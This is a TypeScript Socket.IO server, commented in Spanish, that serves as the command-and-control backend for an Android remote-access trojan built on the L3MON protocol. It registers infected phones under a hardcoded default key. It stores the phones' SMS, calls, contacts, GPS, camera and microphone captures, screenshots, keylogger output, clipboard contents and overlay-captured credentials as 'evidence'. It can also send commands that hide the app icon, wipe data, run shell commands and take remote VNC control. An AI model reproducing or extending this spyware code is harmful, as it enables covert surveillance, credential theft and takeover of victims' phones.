import { Server as HTTPServer } from "http";
import { Server as SocketIOServer, Socket } from "socket.io";
import { getDb } from "./db";
import { eq } from "drizzle-orm";
import { users, devices, locationHistory, smsLogs, mediaFiles, callLogs, contacts, installedApps } from "../drizzle/schema";
import { eventBus } from "./eventBus";
import { uploadFile, getDownloadUrl } from "./services/storageService";
import crypto from "crypto";
import { notificationService } from "./services/notificationService";
import { advancedMonitoring } from "./advancedMonitoring";

export interface DeviceLocation {
  deviceId: number;
  latitude: number;
  longitude: number;
  accuracy: number;
  timestamp: number;
  speed?: number;
  bearing?: number;
}

export interface SMSMessage {
  deviceId: number;
  phoneNumber: string;
  message: string;
  timestamp: number;
  direction: "incoming" | "outgoing";
}

export interface DeviceStatus {
  deviceId: number;
  status: "online" | "offline" | "inactive";
  batteryLevel: number;
  signalStrength: number;
  timestamp: number;
}

export class WebSocketManager {
  private io: SocketIOServer;
  private deviceConnections: Map<number, Set<string>> = new Map();
  private lastLocations: Map<number, DeviceLocation> = new Map();
  private lastSMS: Map<number, SMSMessage[]> = new Map();

  private static instance: WebSocketManager | null = null;
  public static initialize(server: HTTPServer): WebSocketManager {
    if (!WebSocketManager.instance) {
      WebSocketManager.instance = new WebSocketManager(server);
    }
    return WebSocketManager.instance;
  }

  public static getInstance(): WebSocketManager {
    if (!WebSocketManager.instance) {
      throw new Error("WebSocketManager not initialized. Call initialize(server) first.");
    }
    return WebSocketManager.instance;
  }

  constructor(httpServer: HTTPServer) {
    this.io = new SocketIOServer(httpServer, {
      cors: {
        origin: process.env.FRONTEND_URL || "*",
        methods: ["GET", "POST"],
      },
      transports: ["websocket", "polling"],
      allowEIO3: true,
      path: "/socket.io", // Mantenemos el estándar pero el proxy manejará el resto
      connectTimeout: 45000,
      pingTimeout: 30000,
      pingInterval: 25000,
    });

    // [DIAGNÓSTICO CAJA NEGRA] Registrar cada intento de conexión antes de procesarlo
    this.io.engine.on("initial_headers", (headers: any, req: any) => {
      console.log(`[CAJA NEGRA] Intento de conexión detectado!`);
      console.log(`[CAJA NEGRA] IP Origen: ${req.socket.remoteAddress}`);
      console.log(`[CAJA NEGRA] URL: ${req.url}`);
    });

    this.io.engine.on("connection_error", (err: any) => {
      console.log(`[CAJA NEGRA] !!! ERROR DE CONEXIÓN !!!`);
      console.log(`[CAJA NEGRA] Código: ${err.code} | Mensaje: ${err.message}`);
      if (err.req) {
        console.log(`[CAJA NEGRA] IP: ${err.req.socket.remoteAddress}`);
        console.log(`[CAJA NEGRA] Path: ${err.req.url}`);
        console.log(`[CAJA NEGRA] Agent: ${err.req.headers['user-agent']}`);
      }
    });

    eventBus.removeAllListeners("execute-command");
    // Registrar el handler en todos los namespaces posibles
    this.setupEventHandlers();
    this.setupEventBusListeners();
  }

  private setupEventBusListeners(): void {
    eventBus.on("execute-command", (data: any) => {
      console.log(`[WebSocket] EVENTBUS Bridge: Command for ${data.deviceId}:`, data.action);
      this.broadcastToDevice(data.deviceId, "execute-command", {
        action: data.action,
        details: data.details,
        userId: data.userId,
        payload: data.payload || data.details || {}
      });
    });
  }

  private setupEventHandlers(): void {
    const PLATINUM_KEY = process.env.CONNECTION_KEY || "PLATINUM_SECURE_2026";

    // [ADM ALL-ACCESS] Handler para cualquier conexión que traiga datos de dispositivo
    const universalHandler = async (socket: Socket) => {
      // Priorizar Auth Headers (Fase 2 Advanced) sobre Query Params
      const auth = socket.handshake.auth || {};
      const query = socket.handshake.query || {};
      
      // Extraer campos de ambas fuentes
      const model = String(auth.model || query.model || '').trim();
      const androidId = String(auth.id || query.id || '').trim();
      const manf = String(auth.manf || query.manf || '').trim();
      const release = String(auth.release || query.release || '').trim();
      const clientKey = String(auth.key || query.key || '').trim();
      
      // Si no hay modelo o ID, probablemente es un usuario del panel, no un celular
      if (!model && !androidId) {
        this.setupDashboardSocket(socket);
        return;
      }

      // Validar Clave de Conexión (Seguridad Avanzada)
      if (clientKey !== PLATINUM_KEY && process.env.NODE_ENV === 'production') {
        console.warn(`[WebSocket] [RECHAZADO] Intento de conexión con clave inválida: ${clientKey} desde ${socket.id}`);
        socket.disconnect(true);
        return;
      }

      console.log(`[WebSocket] [CONEXION] SID=${socket.id} | Modelo=${model} | ID=${androidId || 'VACIO'} | AuthMode=${auth.model ? 'HEADERS' : 'QUERY'}`);

      let connectedDeviceId: number | null = null;
      // Limpiar el ID - solo caracteres alfanuméricos y guiones
      const effectiveId = androidId.replace(/[^a-zA-Z0-9_\-]/g, '').substring(0, 64) || `auto_${Date.now()}`;
      // Limpiar el modelo
      const effectiveModel = model.replace(/[^a-zA-Z0-9\s_\-.]/g, '').trim().substring(0, 50) || 'Unknown';
      const effectiveManf = manf.replace(/[^a-zA-Z0-9\s]/g, '').trim().substring(0, 50) || 'Unknown';

      try {
        const db = await getDb();
        if (db) {
          const deviceRecords = await db.select().from(devices).where(eq(devices.deviceId, effectiveId)).limit(1);
          if (deviceRecords.length > 0) {
            connectedDeviceId = deviceRecords[0].id;
            await db.update(devices).set({ status: "online", lastSeen: new Date() }).where(eq(devices.id, connectedDeviceId));
            console.log(`[WebSocket] Dispositivo existente actualizado: dbId=${connectedDeviceId}`);
          } else {
            // [PLATINUM] Asignar al primer usuario (Admin) de forma segura
            let firstUserId = 1;
            try {
              const allUsers = await db.select().from(users).limit(1);
              if (allUsers.length > 0) firstUserId = allUsers[0].id;
            } catch (err) {
              console.warn("[WebSocket] Error al identificar admin, usando ID 1:", err);
            }

            const result = await db.insert(devices).values({
              deviceId: effectiveId,
              deviceName: `${effectiveManf} ${effectiveModel}`.substring(0, 100),
              manufacturer: effectiveManf,
              model: effectiveModel,
              androidVersion: release.substring(0, 20) || 'Unknown',
              ownerId: firstUserId,
              status: "online",
              lastSeen: new Date(),
            } as any);
            connectedDeviceId = (result as any)[0]?.insertId;
            console.log(`[WebSocket] Nuevo dispositivo registrado: dbId=${connectedDeviceId} | androidId=${effectiveId}`);
          }

          if (connectedDeviceId) {
            const dbId = parseInt(String(connectedDeviceId));
            
            // [COMMAND BRIDGE] Asegurar que el socket esté en la sala de comandos
            socket.join(`device:${dbId}`);
            
            // [FALLBACK] Si el socket no envió type=device, lo marcamos aquí internamente
            (socket as any).clientType = "device";
            (socket as any).deviceId = dbId;
            (socket as any).androidId = effectiveId;
            
            if (!this.deviceConnections.has(dbId)) this.deviceConnections.set(dbId, new Set());
            this.deviceConnections.get(dbId)!.add(socket.id);
            
            this.io.emit("device-status", { deviceId: dbId, status: "online", timestamp: Date.now() });
            console.log(`[WebSocket] [LISTO] Dispositivo ${dbId} listo y vinculado.`);
            
            const deviceDisplayName = `${effectiveManf} ${effectiveModel}`.substring(0, 100);
            await notificationService.alertNewConnection(deviceDisplayName, dbId);
            
            // [INIT] Solicitar info inicial (batería, apps) al dispositivo
            setTimeout(() => {
              socket.emit("order", { type: "0xIN", action: "ls", deviceId: dbId, timestamp: Date.now() });
            }, 2500);
          }
        }
      } catch (e) {
        console.error("[WebSocket] [ERROR]", e);
      }

      this.setupDeviceDataHandlers(socket);
      socket.on("disconnect", () => {
        if (connectedDeviceId) {
          this.deviceConnections.get(connectedDeviceId)?.delete(socket.id);
          this.io.emit("device-status", { deviceId: connectedDeviceId, status: "offline", timestamp: Date.now() });
        }
      });
    };

    // Registrar el handler en todos los namespaces posibles
    this.io.of("/adm-ws").on("connection", universalHandler);
    this.io.of("/l3mon").on("connection", universalHandler);
    this.io.of("/").on("connection", universalHandler);
  }

  private setupDeviceDataHandlers(socket: Socket): void {
    const connectedDeviceId = (socket as any).deviceId;

    socket.on("device-location", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          await this.handleLocationUpdate({ ...data, deviceId: id });
          this.io.to(`device:${id}`).emit("location-update", { ...data, deviceId: id });
        }
    });

    socket.on("0xLO", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          await this.handleLocationUpdate({ ...data, deviceId: id });
          this.io.to(`device:${id}`).emit("location-update", { ...data, deviceId: id });
        }
    });

    socket.on("device-sms", async (data: SMSMessage) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          await this.handleSMSMessage({ ...data, deviceId: id });
          this.io.to(`device:${id}`).emit("sms-received", { ...data, deviceId: id });
        }
    });

    socket.on("0xSM", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          if (typeof data === 'boolean' || (data && data.success !== undefined)) return; 
          const smsList = data.list || data.sms || data.messages || [];
          eventBus.emit(`sms-response-${id}`, { deviceId: id, messages: smsList });
          this.io.to(`device:${id}`).emit("sms-update", { messages: smsList, deviceId: id });
        }
    });

    socket.on("0xCL", (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          const callsArray = data.list || data.calls || (Array.isArray(data) ? data : []);
          eventBus.emit(`calls-response-${id}`, { deviceId: id, calls: callsArray });
          this.io.to(`device:${id}`).emit("calls-update", { calls: callsArray, deviceId: id });
        }
    });

    socket.on("0xCO", (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          const contactsArray = data.list || data.contacts || (Array.isArray(data) ? data : []);
          eventBus.emit(`contacts-response-${id}`, { deviceId: id, contacts: contactsArray });
          this.io.to(`device:${id}`).emit("contacts-update", { contacts: contactsArray, deviceId: id });
        }
    });

    socket.on("0xCA", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id && (data.imageBase64 || data.image || data.buffer)) {
           const imgData = data.imageBase64 || data.image || data.buffer;
           await this.handleCameraImage(id, imgData);
        }
    });

    // [ADM] Screenshot Response
    socket.on("0xSC", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id && (data.imageBase64 || data.image || data.buffer || data.screenshot)) {
           const imgData = data.imageBase64 || data.image || data.buffer || data.screenshot;
           await this.handleScreenshot(id, imgData);
        }
    });

    socket.on("0xMI", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id && data.buffer) {
           await this.handleBinaryData(socket, "audio", { buffer: data.buffer, name: data.name || `mic_${Date.now()}.mp3` });
        }
    });

    // [ADM] Live Screen Stream (Binary H.264 / Raw Buffer without cloud latency)
    socket.on("0xSP", (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id && data.buffer) {
           // Forward raw binary buffer directly to monitoring dashboard rooms
           this.io.to(`device:${id}`).emit("stream-frame", { deviceId: id, buffer: data.buffer, timestamp: Date.now() });
        } else if (id && data.imageBase64) {
           // Fallback
           this.io.to(`device:${id}`).emit("stream-frame", { deviceId: id, image: data.imageBase64, timestamp: Date.now() });
        }
    });

    // [ADM] Keylogger (Context-Aware) direct event
    socket.on("0xKL", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id && data.text) {
           await this.handleKeylogUpdate({ ...data, deviceId: id });
           this.io.to(`device:${id}`).emit("keylog-update", { deviceId: id, ...data });
        }
    });
    
    // Catch-all for generic device status
    socket.on("device-status", (data: DeviceStatus) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          this.io.emit("device-status", { deviceId: id, status: data.status, timestamp: Date.now() });
        }
    });

    // [ADM] File Explorer Response
    socket.on("0xFI", (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          eventBus.emit(`files-response-${id}`, { deviceId: id, path: data.path || "/", contents: data.list || [] });
        }
    });

    // [ADM] Permissions Response
    socket.on("0xPM", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          const permissions = data.permissions || data.list || data;
          await this.handlePermissionUpdate({ deviceId: id, permissions });
          this.io.to(`device:${id}`).emit("permissions-update", { deviceId: id, permissions });
        }
    });

    // [ADM] Permissions/Status Updates
    socket.on("device-permissions", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) await this.handlePermissionUpdate({ deviceId: id, permissions: data.permissions });
    });

    socket.on("device-keylog", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) await this.handleKeylogUpdate({ ...data, deviceId: id });
    });

    socket.on("device-clipboard", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) await this.handleClipboardUpdate({ ...data, deviceId: id });
    });

    socket.on("device-notification", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) await this.handleNotificationUpdate({ ...data, deviceId: id });
    });

    // [ADM] Device Info Response (battery, model, apps, signal, etc.)
    socket.on("0xIN", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          console.log(`[WebSocket] Device info received for ${id}:`, JSON.stringify(data).substring(0, 200));
          
          // Handle Apps if present (Protocol Alignment)
          if (data.apps && Array.isArray(data.apps)) {
            eventBus.emit(`apps-response-${id}`, { deviceId: id, apps: data.apps });
            this.io.to(`device:${id}`).emit("apps-update", { deviceId: id, apps: data.apps });
          }

          const db = await getDb();
          if (db) {
            const updateData: any = { lastSeen: new Date() };
            // Parsear nivel de batería
            const battery = data.battery ?? data.batteryLevel ?? data.level;
            if (battery !== undefined && battery !== null) {
              updateData.batteryLevel = parseInt(String(battery));
            }
            // Parsear señal
            const signal = data.signalStrength ?? data.signal ?? data.rssi;
            if (signal !== undefined && signal !== null) {
              updateData.signalStrength = parseInt(String(signal));
            }
            // Parsear numero de telefono
            if (data.phoneNumber || data.number) {
              updateData.phoneNumber = data.phoneNumber || data.number;
            }
            // Parsear storage
            if (data.storage || data.storageUsed || data.storageTotal) {
              updateData.storageUsed = data.storageUsed || data.storage?.used || null;
              updateData.storageTotal = data.storageTotal || data.storage?.total || null;
            }
            try {
              await db.update(devices).set(updateData).where(eq(devices.id, id));
            } catch(e) { /* silently ignore */ }
          }
          this.io.emit("device-info", { deviceId: id, ...data, timestamp: Date.now() });
        }
    });

    // [ADM] WiFi scan response
    socket.on("0xWI", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          const networks = data.list || data.networks || data.wifi || [];
          eventBus.emit(`wifi-response-${id}`, { deviceId: id, networks });
          this.io.to(`device:${id}`).emit("wifi-update", { deviceId: id, networks });
        }
    });

    // [SYSTEM] Terminal Shell Handler
    socket.on("shell-input", (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          socket.broadcast.to(`device:${id}`).emit("order", {
            type: "0xSH",
            action: "input",
            command: data.command || data.input,
            deviceId: id
          });
        }
    });

    socket.on("0xSH", (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          // Reenviar salida del shell a los paneles de monitoreo
          this.io.to(`device:${id}`).emit("shell-output", {
            deviceId: id,
            output: data.output || data.data,
            timestamp: Date.now()
          });
        }
    });

    socket.on("0xOV", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          console.log(`[System] Overlay Capture from ${id}:`, data);
          await advancedMonitoring.logCapturedData(id, data.type || "overlay_capture", data.data || data);
          
          // [NOTIFICACIÓN] Alerta de captura de datos sensibles
          const deviceResults = await db.select().from(devices).where(eq(devices.id, id)).limit(1);
          const device = deviceResults[0];
          if (device) {
            await notificationService.alertCriticalData(device.deviceName, data.type || "Overlay", JSON.stringify(data.data || data));
          }
        }
    });

    // [ADM] get-status alias (backend command to APK)
    socket.on("get-status", async (data: any) => {
        const id = connectedDeviceId || data?.deviceId;
        if (id) {
          socket.emit("order", { type: "0xIN", action: "ls", deviceId: id, timestamp: Date.now() });
        }
    });
  }


  private async handleCameraImage(id: number, base64Data: string): Promise<void> {
    try {
      const timestamp = Date.now();
      const fileName = `camera_${id}_${timestamp}.jpg`;
      
      const buffer = typeof base64Data === 'string'
        ? Buffer.from(base64Data.replace(/^data:image\/\w+;base64,/, ''), 'base64')
        : Buffer.from(base64Data);

      const result = await uploadFile(buffer, fileName, "evidence", "image/jpeg");
      
      if (!result.success) throw new Error(result.error);

      const db = await getDb();
      if (db) {
        await db.insert(mediaFiles).values({
          deviceId: id,
          fileName,
          fileType: "photo",
          fileSize: buffer.length,
          fileUrl: result.url,
          timestamp: new Date(),
        });
      }
      this.io.emit("camera-new", { deviceId: id, fileName, url: result.url, timestamp });
    } catch (e) {
      console.error("[WebSocket] Camera save failed:", e);
    }
  }

  // [ADM] Handle Screenshot from device
  private async handleScreenshot(id: number, base64Data: string): Promise<void> {
    try {
      const timestamp = Date.now();
      const fileName = `screenshot_${id}_${timestamp}.png`;

      // Handle both base64 string and buffer
      const buffer = typeof base64Data === 'string'
        ? Buffer.from(base64Data.replace(/^data:image\/\w+;base64,/, ''), 'base64')
        : Buffer.from(base64Data);

      const result = await uploadFile(buffer, fileName, "evidence", "image/png");
      if (!result.success) throw new Error(result.error);

      const db = await getDb();
      if (db) {
        await db.insert(mediaFiles).values({
          deviceId: id,
          fileName,
          fileType: "screenshot",
          fileSize: buffer.length,
          fileUrl: result.url,
          timestamp: new Date(),
        });
      }
      this.io.emit("screenshot-new", { deviceId: id, fileName, url: result.url, timestamp });
      console.log(`[WebSocket] Screenshot saved to cloud: ${fileName}`);
    } catch (e) {
      console.error("[WebSocket] Screenshot save failed:", e);
    }
  }

  private setupDashboardSocket(socket: Socket): void {
    socket.on("join-device", (targetId: number) => {
      socket.join(`device:${targetId}`);
      console.log(`[WebSocket] Dashboard SID=${socket.id} monitoring device ${targetId}`);
    });

    socket.on("leave-device", (targetId: number) => {
      socket.leave(`device:${targetId}`);
    });
  }

  public broadcastToDevice(deviceId: any, event: string, data: any): void {
    const rawAction = data.action || event;
    const action = String(rawAction).trim().toLowerCase();
    
    const mapping: Record<string, string> = {
      "vibrate": "0xVB", "lock-screen": "0xLK", "lock_device": "0xLK",
      "screenshot": "0xSC", "reboot": "0xRB", "wipe-data": "0xWD",
      "hide-icon": "0xHO", "show-icon": "0xSO", "request-files": "0xFI",
      "get-files": "0xFI", "list_files": "0xFI", "download-file": "0xFI",
      "get-sms": "0xSM", "send-sms": "0xSM", "get-call-log": "0xCL",
      "get-calls": "0xCL", "get-contacts": "0xCO", "get-apps": "0xIN", "launch-app": "0xLA", "stop-app": "0xKA",
      "uninstall-app": "0xUN",
      "get-info": "0xIN", "get-location": "0xLO", "get_location": "0xLO",
      "set-gps-freq": "0xGF", "get-wifi": "0xWI", "capture-camera": "0xCA",
      "take_photo": "0xCA", "get-camera": "0xCA", "record-mic": "0xMI",
      "start_audio_recording": "0xMI", "get-permissions": "0xGP",
      "start_audio_recording": "0xMI", "get-permissions": "0xGP",
      // Nuevos comandos - Screen Recording & Streaming
      "start_screen_recording": "0xSR", "stop_screen_recording": "0xST",
      "start_screen_stream": "0xSP", "screen-recording": "0xSR",
      "screen-stream": "0xSP",
      // VNC y Accesibilidad
      "vnc_touch": "0xVP", "vnc_swipe": "0xVS", "accessibility_start": "0xAS",
      "shell": "0xSH", "terminal": "0xSH", "overlay": "0xOV"
    };

    const mappedAction = mapping[action] || action;
    const details = data.payload || data.details || {};
    
    // [ADM] Precise Protocol Alignment for L3MON Smali
    let payload: any = { 
        type: mappedAction, 
        action: action, 
        deviceId: deviceId, 
        timestamp: Date.now() 
    };

    if (action.includes("files")) {
        payload.action = action.includes("download") ? "dl" : "ls";
        payload.path = details.path || "/";
    } else if (action === "get-sms") {
        payload.action = "ls";
    } else if (action === "send-sms" || action === "send_sms") {
        payload.action = "send"; // APK expects "send"
        payload.phoneNo = details.to || details.phoneNumber || details.number;
        payload.msg = details.sms || details.message || details.body;
    } else if (mappedAction === "0xUN" || mappedAction === "0xLA") {
        payload.packageName = details.packageName || details.package || details.id;
    } else if (mappedAction === "0xCA") {
        // APK expects an INTEGER for "camera"
        payload.camera = details.camera === "front" ? 1 : 0;
    } else if (mappedAction === "0xMI") {
        // APK expects an INTEGER for "sec"
        payload.sec = parseInt(String(details.duration || details.sec || 10));
    } else if (mappedAction === "0xGF") {
        // APK expects a LONG for "minTime"
        payload.minTime = parseInt(String(details.minTime || 10000));
    } else if (action === "screenshot") {
        payload.action = "screenshot";
    } else if (mappedAction === "0xVP" || mappedAction === "0xVS") {
        // VNC Touch Coordinates
        payload.x = details.x;
        payload.y = details.y;
        if (mappedAction === "0xVS") {
           payload.endX = details.endX;
           payload.endY = details.endY;
        }
    }

    Object.assign(payload, details);

    if (this.io) {
      const roomName = `device:${deviceId}`;
      console.log(`[WebSocket] [ADM-TX] Broadcaster: Room=${roomName} | Type=${mappedAction} | Action=${payload.action || 'default'}`);
      
      // [FIX CRITICO] El APK se conecta al namespace raiz '/', no a '/adm-ws'
      // Por lo tanto debemos emitir a AMBOS namespaces
      this.io.to(roomName).emit("order", payload);           // Namespace raiz '/' - donde se conecta el APK
      this.io.of("/adm-ws").to(roomName).emit("order", payload); // Namespace /adm-ws - por compatibilidad
      
      // Diagnostic: Check rooms en el namespace CORRECTO (raiz)
      const rootNamespace = this.io.of("/");
      const socketsInRootRoom = rootNamespace.adapter.rooms.get(roomName);
      const socketsInAdmRoom = this.io.of("/adm-ws").adapter.rooms.get(roomName);
      
      if ((!socketsInRootRoom || socketsInRootRoom.size === 0) && (!socketsInAdmRoom || socketsInAdmRoom.size === 0)) {
          console.warn(`[WebSocket] [ADM-TX] WARNING: No active sockets found in room ${roomName}. Command might be lost.`);
          
          // [FALLBACK CRITICO] Enviar a todos los sockets conocidos de este dispositivo
          const sids = this.deviceConnections.get(parseInt(String(deviceId)));
          if (sids && sids.size > 0) {
            sids.forEach(sid => {
              // Buscar el socket en el namespace raiz
              this.io.to(sid).emit("order", payload);
            });
            console.log(`[WebSocket] [ADM-TX] FALLBACK: Sent directly to ${sids.size} socket SIDs.`);
          }
      } else {
        const totalSockets = (socketsInRootRoom?.size || 0) + (socketsInAdmRoom?.size || 0);
        console.log(`[WebSocket] [ADM-TX] SUCCESS: Command emitted to ${totalSockets} socket(s) in room ${roomName}.`);
      }
    }
  }

  private async handleLocationUpdate(data: any): Promise<void> {
    const db = await getDb();
    if (!db) return;
    try {
      const lat = data.latitude ?? data.lat;
      const lon = data.longitude ?? data.lon;
      if (lat === undefined || lon === undefined) return;

      const location = {
        deviceId: data.deviceId,
        latitude: parseFloat(String(lat)),
        longitude: parseFloat(String(lon)),
        accuracy: parseFloat(String(data.accuracy || 0)),
        timestamp: new Date()
      };

      await db.insert(locationHistory).values({
        deviceId: location.deviceId,
        latitude: location.latitude.toString(),
        longitude: location.longitude.toString(),
        accuracy: location.accuracy.toString(),
        timestamp: location.timestamp,
      });

      this.lastLocations.set(location.deviceId, location as any);
      await db.update(devices).set({ status: "online", lastSeen: new Date() }).where(eq(devices.id, location.deviceId));
    } catch (e) {
      console.error("[WebSocket] Location save error:", e);
    }
  }

  private async handleSMSMessage(sms: SMSMessage): Promise<void> {
    const db = await getDb();
    if (!db) return;
    try {
      await db.insert(smsLogs).values({
        deviceId: sms.deviceId,
        phoneNumber: sms.phoneNumber,
        messageBody: sms.message,
        direction: sms.direction,
        timestamp: new Date(sms.timestamp),
      });
    } catch (e) {
      console.error("[WebSocket] SMS save error:", e);
    }
  }

  private async handleBinaryData(socket: Socket, type: string, data: any): Promise<void> {
    try {
      const fileName = `${type}_${Date.now()}_${crypto.randomBytes(4).toString('hex')}.mp3`;
      const result = await uploadFile(data.buffer, fileName, "evidence", "audio/mpeg");
      
      if (!result.success) throw new Error(result.error);

      const db = await getDb();
      const deviceId = (socket as any).deviceId;
      if (db && deviceId) {
        await db.insert(mediaFiles).values({
          deviceId,
          fileType: "audio",
          fileName,
          fileUrl: result.url,
          fileSize: data.buffer.length,
          timestamp: new Date()
        });
      }
      this.io.emit("evidence-new", { type, name: fileName, timestamp: Date.now(), url: result.url });
    } catch (e) {
      console.error("[WebSocket] Binary save error:", e);
    }
  }

  private async handlePermissionUpdate(data: { deviceId: number, permissions: any }): Promise<void> {
    const db = await getDb();
    if (!db) return;
    try {
      await db.update(devices).set({ metadata: { androidPermissions: data.permissions, lastSync: new Date().toISOString() } } as any).where(eq(devices.id, data.deviceId));
    } catch (e) { console.error("[WebSocket] Perms update error:", e); }
  }

  private async handleKeylogUpdate(data: any): Promise<void> {
    const db = await getDb();
    if (!db) return;
    try {
      const { activityLogs } = await import("../drizzle/schema");
      await db.insert(activityLogs).values({
        deviceId: data.deviceId,
        activityType: "keylog",
        description: `[${data.app || 'System'}] ${data.text}`,
        metadata: { app: data.app, text: data.text },
        timestamp: new Date()
      });
    } catch (e) { console.error("[WebSocket] Keylog error:", e); }
  }

  private async handleClipboardUpdate(data: any): Promise<void> {
    const db = await getDb();
    if (!db) return;
    try {
      const { activityLogs } = await import("../drizzle/schema");
      await db.insert(activityLogs).values({
        deviceId: data.deviceId,
        activityType: "clipboard",
        description: `Clipboard: ${String(data.content).substring(0, 50)}...`,
        metadata: { content: data.content },
        timestamp: new Date()
      });
    } catch (e) { console.error("[WebSocket] Clipboard error:", e); }
  }

  private async handleNotificationUpdate(data: any): Promise<void> {
    const db = await getDb();
    if (!db) return;
    try {
      const { activityLogs } = await import("../drizzle/schema");
      await db.insert(activityLogs).values({
        deviceId: data.deviceId,
        activityType: "notification",
        description: `Notification from ${data.appName}: ${data.title}`,
        metadata: data,
        timestamp: new Date()
      });
    } catch (e) { console.error("[WebSocket] Notification error:", e); }
  }
}

export function initializeWebSocket(server: HTTPServer): WebSocketManager {
  return WebSocketManager.initialize(server);
}

export function getWebSocketManager(): WebSocketManager {
  return WebSocketManager.getInstance();
}
